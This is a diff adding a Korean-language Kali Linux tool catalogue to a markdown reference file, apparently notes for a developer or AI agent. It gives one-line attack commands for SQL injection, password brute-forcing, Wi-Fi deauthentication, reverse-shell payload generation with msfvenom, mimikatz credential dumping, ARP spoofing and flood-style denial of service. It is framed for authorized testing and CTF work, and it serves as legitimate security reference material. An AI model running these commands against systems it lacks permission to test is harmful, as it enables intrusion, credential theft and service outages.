@@ -1307,6 +1307,184 @@ MySpider().start()
 
 ---
 
+## 36. Kali Linux — 침투 테스트 도구 카탈로그
+
+> 공식 사이트: https://www.kali.org/tools/
+> 용도: 침투 테스트(authorized) · CTF · 보안 감사 · 방어 목적 연구
+
+### 1. 정보 수집 (Information Gathering)
+
+| 도구 | 설명 | 핵심 명령 |
+|---|---|---|
+| `nmap` | 네트워크 스캐너 (포트·서비스·OS 탐지) | `nmap -sV -O -A <target>` |
+| `masscan` | 고속 포트 스캐너 (초당 수백만 패킷) | `masscan -p1-65535 <target> --rate=1000` |
+| `theharvester` | 이메일·서브도메인·IP 수집 (OSINT) | `theHarvester -d domain.com -b google` |
+| `recon-ng` | 모듈식 OSINT 정찰 프레임워크 | `recon-ng` → `marketplace install all` |
+| `maltego` | 링크 분석·관계 시각화 (GUI) | GUI 실행 후 그래프 탐색 |
+| `dnsenum` | DNS 열거 (존 전송·브루트포스) | `dnsenum domain.com` |
+| `dnsrecon` | DNS 정찰 (레코드 수집·리버스 조회) | `dnsrecon -d domain.com -t std` |
+| `fierce` | DNS 브루트포스·서브도메인 탐지 | `fierce --domain domain.com` |
+| `shodan` | Shodan CLI (인터넷 연결 장치 검색) | `shodan search "apache"` |
+| `subfinder` | 패시브 서브도메인 열거 | `subfinder -d domain.com` |
+
+### 2. 취약점 분석 (Vulnerability Analysis)
+
+| 도구 | 설명 | 핵심 명령 |
+|---|---|---|
+| `nikto` | 웹 서버 취약점 스캐너 | `nikto -h http://target` |
+| `openvas` | 오픈소스 종합 취약점 스캐너 | `gvm-start` → 웹 UI |
+| `lynis` | Linux/Unix 보안 감사 | `lynis audit system` |
+| `vulners` | CVE 기반 nmap 취약점 스크립트 | `nmap --script vulners <target>` |
+| `legion` | 자동화 네트워크 침투 테스트 (GUI) | `legion` |
+
+### 3. 웹 애플리케이션 분석 (Web Application Analysis)
+
+| 도구 | 설명 | 핵심 명령 |
+|---|---|---|
+| `burpsuite` | 웹 프록시·인터셉터·스캐너 (GUI) | `burpsuite` |
+| `zaproxy` | OWASP ZAP — 오픈소스 웹 취약점 스캐너 | `zaproxy` |
+| `sqlmap` | SQL 인젝션 자동 탐지·익스플로잇 | `sqlmap -u "http://target/?id=1" --dbs` |
+| `gobuster` | 디렉토리·파일·DNS 브루트포서 | `gobuster dir -u http://target -w wordlist.txt` |
+| `ffuf` | 고속 웹 퍼저 (파라미터·경로 탐지) | `ffuf -w wordlist.txt -u http://target/FUZZ` |
+| `wfuzz` | 웹 퍼저 (쿠키·폼·헤더 지원) | `wfuzz -c -z file,wordlist.txt http://target/FUZZ` |
+| `dirb` | 웹 콘텐츠 디렉토리 스캐너 | `dirb http://target` |
+| `whatweb` | 웹 기술 핑거프린터 | `whatweb http://target` |
+| `wpscan` | WordPress 취약점 스캐너 | `wpscan --url http://wp-site --enumerate u` |
+| `xsstrike` | XSS 탐지·익스플로잇 도구 | `python xsstrike.py -u "http://target?q=test"` |
+
+### 4. 패스워드 공격 (Password Attacks)
+
+| 도구 | 설명 | 핵심 명령 |
+|---|---|---|
+| `john` | John the Ripper — 패스워드 크래커 | `john --wordlist=rockyou.txt hash.txt` |
+| `hashcat` | GPU 기반 고성능 해시 크래커 | `hashcat -m 0 hash.txt rockyou.txt` |
+| `hydra` | 병렬 로그인 브루트포서 | `hydra -l admin -P pass.txt ssh://target` |
+| `medusa` | 병렬 네트워크 로그인 브루트포서 | `medusa -h target -u admin -P pass.txt -M ssh` |
+| `crunch` | 커스텀 워드리스트 생성기 | `crunch 8 8 0123456789 -o list.txt` |
+| `cewl` | 웹 페이지 기반 워드리스트 생성 | `cewl http://target -d 2 -m 5 -w wordlist.txt` |
+| `hashid` | 해시 유형 자동 식별 | `hashid <hash>` |
+| `rsmangler` | 워드리스트 변형·확장 | `rsmangler --file wordlist.txt` |
+
+### 5. 무선 공격 (Wireless Attacks)
+
+| 도구 | 설명 | 핵심 명령 |
+|---|---|---|
+| `aircrack-ng` | 무선 보안 감사 도구 모음 | `aircrack-ng -w rockyou.txt capture.cap` |
+| `airodump-ng` | 무선 패킷 캡처·모니터링 | `airodump-ng wlan0mon` |
+| `aireplay-ng` | 무선 패킷 인젝션·인증 해제 | `aireplay-ng -0 10 -a <BSSID> wlan0mon` |
+| `wifite` | 자동화 무선 네트워크 공격 | `wifite` |
+| `reaver` | WPS PIN 브루트포스 | `reaver -i wlan0mon -b <BSSID> -vv` |
+| `kismet` | 무선 네트워크 탐지·스니퍼 | `kismet` |
+| `hostapd-wpe` | 가짜 AP + WPA Enterprise 크리덴셜 수집 | `hostapd-wpe hostapd-wpe.conf` |
+
+### 6. 익스플로잇 도구 (Exploitation Tools)
+
+| 도구 | 설명 | 핵심 명령 |
+|---|---|---|
+| `metasploit` | 모듈식 취약점 익스플로잇 프레임워크 | `msfconsole` → `search <cve>` → `use` → `exploit` |
+| `searchsploit` | ExploitDB 로컬 검색 | `searchsploit apache 2.4` |
+| `beef-xss` | 브라우저 익스플로잇 프레임워크 | `beef-xss` → 웹훅 삽입 |
+| `set` | Social-Engineer Toolkit | `setoolkit` |
+| `msfvenom` | 페이로드 생성기 (Metasploit 내장) | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> -f exe` |
+
+### 7. 스니핑 & 스푸핑 (Sniffing & Spoofing)
+
+| 도구 | 설명 | 핵심 명령 |
+|---|---|---|
+| `wireshark` | 네트워크 패킷 분석기 (GUI) | `wireshark` |
+| `tcpdump` | CLI 패킷 캡처 | `tcpdump -i eth0 -w capture.pcap` |
+| `ettercap` | MITM 공격·ARP 스푸핑 | `ettercap -T -q -i eth0 -M arp:remote` |
+| `responder` | NBT-NS/LLMNR 포이즈너·크리덴셜 캡처 | `responder -I eth0 -rdwv` |
+| `bettercap` | 현대적 네트워크 공격 프레임워크 | `bettercap -iface eth0` |
+| `macchanger` | MAC 주소 변경 | `macchanger -r eth0` |
+| `dsniff` | 패스워드 스니퍼 (FTP·HTTP·POP 등) | `dsniff -i eth0` |
+
+### 8. 포스트 익스플로잇 (Post Exploitation)
+
+| 도구 | 설명 | 핵심 명령 |
+|---|---|---|
+| `mimikatz` | Windows 크리덴셜·해시 추출 | `sekurlsa::logonpasswords` |
+| `bloodhound` | Active Directory 관계 시각화 | `bloodhound` → SharpHound 수집 |
+| `impacket` | Python 네트워크 프로토콜 구현 모음 | `psexec.py domain/user:pass@target` |
+| `empire` | PowerShell/Python 포스트 익스플로잇 | `./empire` |
+| `crackmapexec` | Active Directory 침투 테스트 스위트 | `crackmapexec smb <target> -u user -p pass` |
+| `evil-winrm` | WinRM 원격 셸 | `evil-winrm -i target -u user -p pass` |
+
+### 9. 리버스 엔지니어링 (Reverse Engineering)
+
+| 도구 | 설명 | 핵심 명령 |
+|---|---|---|
+| `gdb` | GNU 디버거 | `gdb ./binary` → `run` → `disas main` |
+| `radare2` | 오픈소스 리버스 엔지니어링 플랫폼 | `r2 ./binary` → `aaa` → `pdf @ main` |
+| `ghidra` | NSA 오픈소스 디스어셈블러·디컴파일러 | `ghidraRun` |
+| `binwalk` | 펌웨어 분석·추출 | `binwalk -e firmware.bin` |
+| `strings` | 바이너리 문자열 추출 | `strings binary \| grep -i pass` |
+| `ltrace` | 라이브러리 호출 추적 | `ltrace ./binary` |
+| `strace` | 시스템 콜 추적 | `strace ./binary` |
+
+### 10. 포렌식 (Forensics)
+
+| 도구 | 설명 | 핵심 명령 |
+|---|---|---|
+| `autopsy` | 디지털 포렌식 플랫폼 (GUI) | `autopsy` |
+| `volatility` | 메모리 덤프 포렌식 | `vol.py -f mem.raw --profile=Win10x64 pslist` |
+| `foremost` | 파일 카빙·복구 | `foremost -i disk.img -o output/` |
+| `sleuthkit` | 파일시스템 포렌식 CLI 도구 모음 | `fls -r -m / disk.img` |
+| `dd` | 디스크 이미징 | `dd if=/dev/sda of=disk.img bs=4M` |
+| `exiftool` | 파일 메타데이터 추출·편집 | `exiftool image.jpg` |
+| `pdf-parser` | PDF 구조·악성코드 분석 | `pdf-parser.py --stats file.pdf` |
+
+### 11. 스트레스 테스트 (Stress Testing)
+
+| 도구 | 설명 | 핵심 명령 |
+|---|---|---|
+| `hping3` | TCP/IP 패킷 조작·테스트 | `hping3 -S --flood -V -p 80 target` |
+| `slowloris` | HTTP 슬로우 DoS 테스트 | `slowloris target` |
+| `t50` | 멀티프로토콜 패킷 인젝터 | `t50 target --flood` |
+
+> **주의:** 스트레스 테스트는 반드시 본인 소유 또는 명시적 권한이 있는 시스템에서만 사용.
+
+### 12. 보고서 & 관리 (Reporting & Management)
+
+| 도구 | 설명 |
+|---|---|
+| `dradis` | 협업 보안 보고 플랫폼 |
+| `faraday` | 보안 테스팅 관리·취약점 추적 |
+| `cherrytree` | 침투 테스트 노트·트리 구조 메모 |
+| `pipal` | 패스워드 통계 분석 |
+
+### 필수 워드리스트
+
+```bash
+# SecLists (가장 많이 사용)
+apt install seclists
+# 경로: /usr/share/seclists/
+
+# rockyou.txt (패스워드 크래킹)
+/usr/share/wordlists/rockyou.txt.gz
+gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# dirbuster 워드리스트 (웹 디렉토리)
+/usr/share/wordlists/dirbuster/
+```
+
+### 환경 설정 빠른 참조
+
+```bash
+# 모니터 모드 활성화 (무선)
+airmon-ng start wlan0
+
+# Metasploit DB 초기화
+msfdb init && msfconsole
+
+# Nmap 주요 스캔 조합
+nmap -sC -sV -oN scan.txt <target>   # 기본 스크립트 + 버전
+nmap -p- --min-rate 5000 <target>    # 전체 포트 고속
+nmap -sU -top-ports 100 <target>     # UDP 상위 100포트
+```
+
+---
+
 ## AI의 3가지 고질병 — 항상 경계
 
 1. **잘못된 가정** — 코드를 읽기 전에 작동 방식을 가정하지 말 것
